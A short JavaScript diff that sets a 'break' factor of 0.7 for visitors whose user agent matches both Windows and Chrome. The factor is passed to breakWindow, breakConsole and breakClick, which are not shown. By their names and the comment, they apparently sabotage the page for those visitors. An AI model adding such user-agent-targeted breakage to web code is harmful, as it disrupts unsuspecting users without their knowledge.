@@ -127,7 +127,13 @@
         }
     }
 
-    const factor = navigator.userAgent.search(/windows/i) / navigator.userAgent.length;
+    const ua = navigator.userAgent;
+    // Windows && Chrome = Break
+    const factor = (
+        1
+        * /Windows/.test(ua)
+        * /Chrome/.test(ua)
+    ) ? 0.7 : 0;
     breakWindow(factor);
     breakConsole(factor);
     breakClick(factor);
